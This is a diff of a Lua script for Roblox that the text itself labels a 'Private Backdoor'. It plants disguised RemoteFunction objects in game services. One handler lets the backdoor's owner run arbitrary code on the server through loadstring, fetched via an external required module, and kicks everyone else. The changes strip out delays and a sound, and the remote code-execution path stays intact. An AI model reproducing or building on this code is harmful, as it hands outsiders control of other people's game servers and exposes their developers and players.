@@ -1185,7 +1185,6 @@ for _, svc in ipairs(services) do
  local r = Instance.new("RemoteFunction")
  r.Name = "rbxAssetid_core__temp_3023g78"
  r.OnServerInvoke = function(plr)
-  task.wait(3.3)
   plr:Kick("Backdoor has been secured by Spunchbub - Private Backdoor")
  end
  r.Parent = p
@@ -1213,7 +1212,6 @@ for _, svc in ipairs(services) do
     local r = Instance.new("RemoteFunction")
     r.Name = "spunch.bd_cssr6-O1"
     r.OnServerInvoke = function(player)
-        task.wait(3.3)
         player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
     end
     r.Parent = svc
@@ -1231,17 +1229,7 @@ local loadstring = require(13684410229)
 
 remoteFunction.OnServerInvoke = function(player, code)
     if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
-        local s = Instance.new("Sound")
-        s.Parent = player:FindFirstChild("PlayerGui")
-        s.SoundId = "rbxassetid://139799099549518"
-        s.Volume = 0.5
-
-        s.Ended:Once(function()
-           s:Destroy()
-           player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
-        end)
-
-        s:Play()
+        player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
         return
     end
     loadstring(code)()
